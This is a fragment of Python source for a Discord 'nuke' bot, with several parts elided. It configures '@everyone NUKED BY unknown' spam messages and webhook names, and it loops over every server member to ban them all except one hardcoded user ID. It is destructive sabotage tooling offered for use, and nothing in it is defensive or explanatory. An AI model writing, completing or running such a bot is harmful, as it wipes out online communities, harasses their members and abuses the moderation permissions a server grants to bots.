...
message_spam = ['@everyone NUKED BY unknown']
webhook_names = ['NUKED BY unknown']
###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "lol" ))#change this if you want
  print(f''' 
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "NUKED BY unknown")
